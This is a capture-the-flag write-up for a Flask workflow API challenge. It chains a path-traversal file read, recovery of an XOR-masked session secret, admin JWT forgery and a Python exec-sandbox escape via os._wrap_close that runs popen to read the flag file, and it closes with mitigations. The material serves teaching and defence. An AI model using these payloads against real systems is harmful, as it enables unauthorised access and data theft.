# FlowForge (ni8mare-lite) Challenge

<div class="grid cards" markdown>

- :material-information-outline: &nbsp; **Challenge Info**

    ---

  - 🏷️ **Category:** API
  - 💻 **Platform:** Fluid Attacks CTF 2026-2
  - 🎯 **Target:** [chal.ctf.ae](https://2557f8acdd3cf1ab.chal.ctf.ae)
  - 🚩 **Flag:** `flag{eb59b3f68e640ea5}`

- :material-tools: &nbsp; **Tools Required**

    ---

  - `curl` — Endpoint probing & path-traversal LFI
  - `python3` (`PyJWT`, `requests`) — Secret recovery, admin JWT forgery & sandbox-escape exploit

</div>

!!! abstract "Challenge Description"
    FlowForge is a Flask/gunicorn workflow-automation API (full source provided). The flag is
    written to a randomly named `/flag_<16hex>.txt` and `FLAG` is unset from the environment,
    so the only way in is to read the filesystem as the `flowforge` user. The intended path is
    a four-link chain: path-traversal LFI → predictable secret derivation → JWT forgery →
    Python `exec`-sandbox escape (RCE). Several endpoints are deliberate red herrings.

## Description

FlowForge is a workflow-automation API; full source was provided (`code/app.py`,
`Dockerfile`, `entrypoint.sh`). The flag is written to a **randomly named file**
`/flag_<16hex>.txt` (mode `444`, owned by root) by `entrypoint.sh`, and `FLAG` is unset from
the environment before gunicorn starts — so the only way in is to read the filesystem as the
`flowforge` user. Getting there is a four-link chain; several endpoints are deliberate red
herrings.

## Recon (source review)

- **`entrypoint.sh`** — flag at `/flag_$(head -c8 /dev/urandom|xxd -p).txt`, `FLAG` unset,
  app runs as unprivileged `flowforge`. The random name means we must **list `/`** and **read**
  the file at runtime.
- **`/api/workflows/evaluate`** is the *actual* vuln: it `compile()`+`exec()`s an
  attacker-supplied `expression` in a restricted-builtins sandbox. Gated by
  `verify_admin_token()` → a valid **HS256 JWT signed with `SESSION_SECRET`**, `role=admin`.
- **`SESSION_SECRET = os.urandom(24).hex()`** (unknown), BUT `init_app()` writes
  `/app/.internal/config.json` containing
  `session_secret = XOR(SESSION_SECRET, sha256(str(BOOT_TIMESTAMP))[:48])` (hex). The XOR key
  is derived purely from `BOOT_TIMESTAMP`, which `/api/health` returns as `started_at`.
- **`/api/webhooks/trigger`** — accepts `files:[{path}]`, `os.path.normpath`s the path, and
  `open()`s it if it ends in `.json`/`.yml`/`.db`, returning a 512-byte preview. No traversal
  guard → **arbitrary file read** for those extensions. `config.json` qualifies.

### Red herrings (confirmed dead)

- `/api/workflows/debug` — `shlex.quote` + allowlist, safe.
- `/api/notifications/preview` — template with strict charset + name sanitization, no SSTI.
- `/api/workflows/import` — admin-gated, heavily validated, returns nothing useful.

## Exploitation

**1. LFI → leak XOR-encoded secret**

```json
POST /api/webhooks/trigger
{"workflow_id":"x","files":[{"path":"/app/.internal/config.json"}]}
```

Preview returns `{"session_secret":"c49d61...f03d...e14","version":"2.1.0"}`.

**2. Recover `SESSION_SECRET`** — `started_at` from `/api/health` gives `BOOT_TIMESTAMP`:

```
xor_key = sha256(str(BOOT_TIMESTAMP).encode()).digest()[:48]   # 32 bytes, cycled
SESSION_SECRET = xor(bytes.fromhex(session_secret), xor_key).decode()
# -> 242ecfff3b02fe440bf3bbf1d7da50f4f4a2ebcf577d47d7
```

**3. Forge admin JWT** — `jwt.encode({"role":"admin","user":"admin"}, SESSION_SECRET, "HS256")`.
Confirmed against admin-only `/api/system/info` → `200`.

**4. Sandbox escape → RCE** on `/api/workflows/evaluate`. `BLOCKED_PATTERNS` filter the raw
expression for `os`, `open`, `import`, `__import__`, `eval`, `exec`, `globals`, … as *word-
boundary* tokens, and builtins are stripped. Two observations break it:

- `().__class__.__base__.__subclasses__()` reaches every loaded class; the os module is
  imported by the app, so **`os._wrap_close`** is present. Its `__init__.__globals__` **is the
  os module namespace**, exposing `popen`, `system`, `listdir` — none of which are blocked
  words, and we never type `os`/`open`/`import`.
- `__globals__` sails past `\bglobals\b` because the surrounding underscores are word chars, so
  there is no word boundary around `globals`.

```python
res=None
for c in ().__class__.__base__.__subclasses__():
 if getattr(c,'__name__','')=='_wrap_close':
  g=c.__init__.__globals__
  res=g['popen']('cat /flag_*.txt; echo; ls -la /').read()
  print(res)
  break
```

`print` is captured into `result`. The shell glob `/flag_*.txt` resolves the random flag file
(`/flag_5fcd25ba3cadb662.txt`).

Full exploit: `scripts/solve.py` (LFI → derive secret → forge JWT → escape → flag). Replayed,
same flag.

## Flag

```
flag{eb59b3f68e640ea5}
```

## Mitigation

- `/api/webhooks/trigger`: resolve the path and confirm it stays within an allowed base dir
  (`os.path.realpath` + prefix check); never trust an extension suffix as an access control.
- Do not persist a reversible transform of a secret whose only input (boot time) is publicly
  observable — store nothing, or encrypt with an out-of-band key.
- Never build an "eval sandbox" on `exec`/`compile` with denylists; Python object graphs are
  not sandboxable this way. Remove the endpoint or use a real sandbox (separate process, seccomp).
- Run the flag file outside any path the service user can reach; drop the file-read primitive.

## Timeline

1. Read provided source; mapped the flag file + the `evaluate` sandbox as the real target.
2. Spotted `SESSION_SECRET` is reversible from `config.json` + `BOOT_TIMESTAMP`.
3. Used the webhook `.json` LFI to read `config.json`; pulled `started_at` from `/api/health`.
4. Reconstructed the secret, forged an admin JWT, escaped the sandbox via `os._wrap_close`
   globals → `popen` → read `/flag_*.txt`. Replayed to confirm.
